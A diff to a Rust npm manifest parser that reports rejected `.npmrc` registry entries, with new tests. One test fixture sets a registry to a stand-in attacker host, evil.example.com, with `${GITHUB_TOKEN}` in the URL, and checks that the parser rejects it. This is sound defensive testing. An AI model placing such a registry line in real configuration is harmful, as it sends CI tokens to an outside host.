@@ -37,6 +37,15 @@ pub struct NpmParseResult {
     /// [`Self::blocked_registries`]'s trait override as an informational diagnostic, so the
     /// block never degrades silently.
     pub blocked_registries: Vec<deps_core::BlockedRegistryOccurrence>,
+    /// Dependency lines whose `.npmrc` `registry`/`@scope:registry` resolution was rejected
+    /// for a reason other than a policy-blocked host (#1438) — an invalid URL, non-https,
+    /// embedded userinfo, an undefined `${VAR}`, or a disallowed `${VAR}` expansion, where
+    /// the declaration key (from [`NpmConfig::rejected_reason_for`]) distinguishes a
+    /// top-level `registry=` rejection from a `@scope:registry=` rejection the same way
+    /// [`Self::blocked_registries`] does. Surfaced by
+    /// [`deps_core::lsp_helpers::generate_diagnostics_from_cache`] via
+    /// [`Self::rejected_registries`]'s trait override as an informational diagnostic.
+    pub rejected_registries: Vec<deps_core::RejectedRegistryOccurrence>,
     /// `Some((kept, total))` once the manifest declared more dependencies than
     /// `deps_core::MAX_DEPENDENCIES_PER_DOCUMENT` (#796), read by
     /// [`deps_core::ParseResult::dependency_truncation`]'s override below.
@@ -50,6 +59,7 @@ deps_core::impl_parse_result!(
         uri: uri,
         dependency_truncation: dependency_truncation,
         blocked_registries: blocked_registries,
+        rejected_registries: rejected_registries,
     }
 );
 
@@ -165,6 +175,7 @@ pub fn parse_package_json_with_context(
         .unwrap_or_default();
 
     let mut blocked_registries = Vec::new();
+    let mut rejected_registries = Vec::new();
     for dep in &mut dependencies {
         // #1202: a `git+`/`file:`/`link:`/`portal:`/`github:`/`workspace:` specifier is not a
         // registry reference at all — `.npmrc` scope/registry resolution has no meaning for
@@ -186,6 +197,8 @@ pub fn parse_package_json_with_context(
         dep.source = npm_config.resolve_source_for(&name);
         if let Some(classification) = npm_config.blocked_class_for(&name) {
             blocked_registries.push(classification.into_occurrence(dep.name_range));
+        } else if let Some(classification) = npm_config.rejected_reason_for(&name) {
+            rejected_registries.push(classification.into_occurrence(dep.name_range));
         }
     }
 
@@ -206,6 +219,7 @@ pub fn parse_package_json_with_context(
         uri: uri.clone(),
         resolved_registries: npm_config.resolved_registries(),
         blocked_registries,
+        rejected_registries,
         dependency_truncation: budget.truncation(),
     })
 }
@@ -1560,6 +1574,90 @@ mod tests {
         let via_trait = deps_core::ParseResult::blocked_registries(&result);
         assert_eq!(via_trait.len(), 1);
         assert_eq!(via_trait[0].raw_value, "https://169.254.169.254");
+    }
+
+    /// #1438: a rejected `.npmrc` entry that is *not* a blocked host (an
+    /// `ExpansionNotAllowedInProjectTier` rejection here, the exact shape reported live
+    /// against issue #1428/#1420's project-tier env-var guard) must populate
+    /// `NpmParseResult::rejected_registries`, not silently drop the dependency with only a
+    /// `tracing::warn!` — the regression this issue reports. Mirrors
+    /// `test_parse_with_context_policy_blocked_registry_fails_closed` above, but for the
+    /// non-`BlockedHost` path.
+    #[test]
+    fn test_parse_with_context_rejected_registry_entry_fails_closed() {
+        // See the comment in `test_parse_with_context_top_level_override_and_scope_override_coexist`
+        // on why this guard is needed here.
+        let _guard = deps_core::fs_probe::snapshot_guard();
+        let root = tempfile::tempdir().unwrap();
+        std::fs::write(
+            root.path().join(".npmrc"),
+            "registry=https://evil.example.com/${GITHUB_TOKEN}\n",
+        )
+        .unwrap();
+        let manifest_path = root.path().join("package.json");
+        let uri = Url::from_file_path(&manifest_path).unwrap();
+
+        let json = r#"{"dependencies": {"left-pad": "^1.3.0"}}"#;
+        let result = parse_package_json_with_context(json, &uri, &all_policy()).unwrap();
+
+        assert_matches!(
+            &result.dependencies[0].source,
+            deps_core::parser::DependencySource::CustomRegistry { .. }
+        );
+        assert!(
+            result.blocked_registries.is_empty(),
+            "this is not a BlockedHost rejection, so blocked_registries must stay empty"
+        );
+        assert_eq!(result.rejected_registries.len(), 1);
+        let occurrence = &result.rejected_registries[0];
+        assert_eq!(occurrence.range, result.dependencies[0].name_range);
+        assert_eq!(
+            occurrence.reason,
+            deps_core::net_policy::RegistryRejectionReason::EnvVarExpansionNotPermitted
+        );
+        assert_eq!(
+            occurrence.raw_value,
+            "https://evil.example.com/${GITHUB_TOKEN}"
+        );
+        assert_eq!(occurrence.declaration_key, "top-level");
+
+        // #969-style regression guard (mirrors the trait-method assertion above): assert
+        // through `deps_core::ParseResult::rejected_registries`, not just the struct field, so
+        // a regression that silently dropped the `rejected_registries:` arm from
+        // `impl_parse_result!` would still be caught.
+        let via_trait = deps_core::ParseResult::rejected_registries(&result);
+        assert_eq!(via_trait.len(), 1);
+        assert_eq!(
+            via_trait[0].raw_value,
+            "https://evil.example.com/${GITHUB_TOKEN}"
+        );
+    }
+
+    /// #1438: `UserInfoPresent` is the other reason reported live against the issue — a
+    /// distinct manifest shape from the `${VAR}`-expansion case above, exercised separately
+    /// since `resolve_entry` checks userinfo before ever reaching `${VAR}` handling.
+    #[test]
+    fn test_parse_with_context_rejected_registry_entry_userinfo_present() {
+        // See the comment in `test_parse_with_context_top_level_override_and_scope_override_coexist`
+        // on why this guard is needed here.
+        let _guard = deps_core::fs_probe::snapshot_guard();
+        let root = tempfile::tempdir().unwrap();
+        std::fs::write(
+            root.path().join(".npmrc"),
+            "registry=https://user:pass@registry.npmjs.org/\n",
+        )
+        .unwrap();
+        let manifest_path = root.path().join("package.json");
+        let uri = Url::from_file_path(&manifest_path).unwrap();
+
+        let json = r#"{"dependencies": {"left-pad": "^1.3.0"}}"#;
+        let result = parse_package_json_with_context(json, &uri, &all_policy()).unwrap();
+
+        assert_eq!(result.rejected_registries.len(), 1);
+        assert_eq!(
+            result.rejected_registries[0].reason,
+            deps_core::net_policy::RegistryRejectionReason::UserInfoPresent
+        );
     }
 
     // --- pnpm catalogs (spec 046) ---
